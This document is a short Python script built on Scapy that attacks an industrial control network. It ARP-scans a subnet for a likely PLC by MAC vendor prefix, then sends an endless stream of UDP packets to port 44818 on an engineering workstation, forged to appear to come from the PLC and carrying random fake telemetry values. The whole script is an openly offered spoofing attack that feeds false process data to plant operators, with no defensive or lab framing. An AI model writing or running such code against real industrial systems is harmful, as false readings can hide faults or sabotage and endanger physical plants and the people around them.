from scapy.all import *
import time
import random

# Define the IP of the Engineering Workstation (operator station)
ENGINEERING_WORKSTATION_IP = "192.168.1.100"  # Change this as needed

# Function to detect the PLC IP via ARP scanning
def find_plc_ip(network="192.168.1.0/24"):
    print("[*] Scanning network for PLC device...")
    ans, _ = arping(network, timeout=2, verbose=False)
    
    for sent, received in ans:
        ip = received.psrc
        mac = received.hwsrc
        
        # Assuming PLC has a specific MAC vendor (e.g., Siemens, Rockwell)
        if mac.startswith(("00:0e:", "00:1a:", "00:80:")):  
            print(f"[+] Possible PLC found at IP: {ip}")
            return ip
    print("[-] No PLC found. Exiting...")
    return None

# Function to spoof telemetry data from PLC to the Engineering Workstation
def spoof_reporting_message(plc_ip):
    print("[*] Initiating Spoofed Reporting Messages to Engineering Workstation...")
    
    while True:
        telemetry_value = random.randint(50, 100)  # Generate spoofed telemetry data
        spoofed_packet = IP(src=plc_ip, dst=ENGINEERING_WORKSTATION_IP) / UDP(dport=44818) / Raw(load=f"Telemetry={telemetry_value}")

        send(spoofed_packet, verbose=False)
        print(f"[+] Spoofed Message Sent: 'Telemetry={telemetry_value}' from {plc_ip} to {ENGINEERING_WORKSTATION_IP}")
        
        time.sleep(3)  # Send messages at regular intervals

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        spoof_reporting_message(plc_ip)